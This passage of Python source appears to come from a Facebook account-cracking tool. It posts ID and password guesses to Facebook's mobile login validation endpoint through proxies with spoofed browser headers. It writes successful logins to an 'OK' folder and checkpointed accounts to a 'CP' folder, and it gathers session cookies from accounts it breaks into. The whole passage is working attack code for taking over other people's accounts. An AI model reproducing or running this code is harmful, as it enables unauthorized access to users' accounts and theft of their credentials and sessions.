    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                print(f'\r\033[0;93m[\33[1;96mCHECK\33[1;93m]  {idf}  {pw} ')
                print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                print(f'\r\33[1;93m[\33[1;92mSUCCES\33[1;93m] \33[1;92m{idf} {pw} ')
                print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()